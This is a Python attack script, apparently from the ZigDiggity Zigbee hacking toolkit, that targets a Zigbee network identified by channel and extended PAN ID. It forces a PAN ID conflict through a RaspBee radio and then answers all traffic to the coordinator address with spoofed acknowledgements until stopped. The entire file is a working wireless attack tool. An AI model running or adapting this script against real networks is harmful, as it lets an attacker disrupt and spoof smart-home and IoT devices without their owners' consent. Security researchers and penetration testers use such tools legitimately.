import os
import sys
sys.path.append(os.getcwd() + "/zigdiggity")

import time
import signal
import argparse
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *

from zigdiggity.radios.raspbee_radio import RaspbeeRadio
from zigdiggity.radios.observer_radio import ObserverRadio
from zigdiggity.observers.wireshark_observer import WiresharkObserver
import zigdiggity.crypto.utils as crypto_utils
from zigdiggity.misc.actions import *
from zigdiggity.packets.utils import get_pan_id, get_source
from zigdiggity.interface.components.logo import Logo

parser = argparse.ArgumentParser(description='Perform an acknowledge attack against the target network')
parser.add_argument('-c','--channel',action='store',type=int,dest='channel',required=True,help='Channel to use')
parser.add_argument('-e','--epan',action='store',type=lambda s: int(s.replace(':',''),16),dest='epan',required=True,help='The Extended PAN ID of the network to target')
parser.add_argument('-w','--wireshark',action='store_true',dest='wireshark',required=False,help='The Extended PAN ID of the network to target')
args = parser.parse_args()

logo = Logo()
logo.print()

hardware_radio = RaspbeeRadio("/dev/ttyS0")
radio = ObserverRadio(hardware_radio)

if args.wireshark:
    wireshark = WiresharkObserver()
    radio.add_observer(wireshark)

def handle_interrupt(signal, frame):
    global interrupted
    print_notify("Exiting the current script")
    interrupted = True

CHANNEL = args.channel
TARGET_EPAN=args.epan

radio.set_channel(CHANNEL)

panid = get_pan_by_extended_pan(radio, TARGET_EPAN)
if panid is None:
    print_error("Could not find the PAN ID corresponding to the target network.")
    exit(1)

print_info("Performing a PAN ID conflict against the network")

for attempts in range(10):
    pan_conflict_by_panid(radio, panid)
    time.sleep(2)
    next_panid = get_pan_by_extended_pan(radio, TARGET_EPAN)
    if panid != next_panid:
        break
    if attempts == 9:
        print_error("All 10 attempts to perform a PAN ID conflict failed.")

signal.signal(signal.SIGINT, handle_interrupt)
interrupted = False

print_notify("Acking to all the traffic to PAN 0x%04x" % panid)
print_info("Use ctrl+c to stop the attack")
while not interrupted:
    radio.receive_and_ack(panid=panid, addr=0x0000)

radio.off()
